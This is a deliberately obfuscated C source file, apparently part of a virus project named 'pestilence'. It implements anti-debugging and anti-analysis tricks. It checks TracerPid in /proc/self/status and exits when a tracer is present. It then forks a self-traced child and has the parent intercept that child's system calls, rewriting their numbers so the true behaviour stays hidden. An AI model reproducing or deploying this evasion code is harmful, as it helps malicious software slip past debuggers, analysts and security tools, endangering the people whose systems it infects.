#include "../include_obfuscated/pestilence.h"
static bool _OII_ll0_lI11(void) { FILE *__1IIl1IlI1IO; char _0llll00O0_0l[256]; __1IIl1IlI1IO = fopen("/proc/self/status", "r"); if (!__1IIl1IlI1IO) return false; while (fgets(_0llll00O0_0l, sizeof(_0llll00O0_0l), __1IIl1IlI1IO)) { if (strncmp(_0llll00O0_0l, "TracerPid:", 10) == 0) { int _O0OI_II011O1; sscanf(_0llll00O0_0l + 10, "%d", &_O0OI_II011O1); fclose(__1IIl1IlI1IO); return (_O0OI_II011O1 != 0); } } fclose(__1IIl1IlI1IO); return false; } void _0OlllIlI1001(void) { if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) { exit(1); } raise(SIGSTOP); _I____lO0lll0 /= 4; _0I0I_O0_I1_1(); exit(0); } void _100_I01IlO0O(pid_t _0lIllO1I1__I) { int _I_l1l1__I1O_; struct user_regs_struct _OO0O_1_O0__O; waitpid(_0lIllO1I1__I, &_I_l1l1__I1O_, 0); if (!WIFSTOPPED(_I_l1l1__I1O_)) { return; } ptrace(PTRACE_SETOPTIONS, _0lIllO1I1__I, 0, PTRACE_O_EXITKILL); while (1) { ptrace(PTRACE_SYSCALL, _0lIllO1I1__I, 0, 0); waitpid(_0lIllO1I1__I, &_I_l1l1__I1O_, 0); if (WIFEXITED(_I_l1l1__I1O_) || WIFSIGNALED(_I_l1l1__I1O_)) break; ptrace(PTRACE_GETREGS, _0lIllO1I1__I, 0, &_OO0O_1_O0__O); bool _lOI0I_I0lI0I = false; if (_OO0O_1_O0__O.orig_rax == __0lOO011_0lO) { _OO0O_1_O0__O.orig_rax = 1; _lOI0I_I0lI0I = true; } else if (_OO0O_1_O0__O.orig_rax == _lO0IlOll1I0O) { _OO0O_1_O0__O.orig_rax = 2; _lOI0I_I0lI0I = true; } else if (_OO0O_1_O0__O.orig_rax == __00IOll0_0_l) { _OO0O_1_O0__O.orig_rax = 3; _lOI0I_I0lI0I = true; } if (_lOI0I_I0lI0I) { ptrace(PTRACE_SETREGS, _0lIllO1I1__I, 0, &_OO0O_1_O0__O); } ptrace(PTRACE_SYSCALL, _0lIllO1I1__I, 0, 0); waitpid(_0lIllO1I1__I, &_I_l1l1__I1O_, 0); if (WIFEXITED(_I_l1l1__I1O_) || WIFSIGNALED(_I_l1l1__I1O_)) break; } } void _O_IOlOlI01l_(int _OI1I0101l00_) { if (_OI1I0101l00_ == 0) { _0I0I_O0_I1_1(); } else { _100_I01IlO0O(_OI1I0101l00_); } } void _O_IO1I_lOO_l(void) { pid_t _O1l0Il1100_O; _O1l0Il1100_O = fork(); if (_OII_ll0_lI11()) exit(1); if (_O1l0Il1100_O == -1) { exit(1); } _I____lO0lll0 = (_I____lO0lll0 * -1) * (_I____lO0lll0 * -1); _O_IOlOlI01l_(_O1l0Il1100_O); } 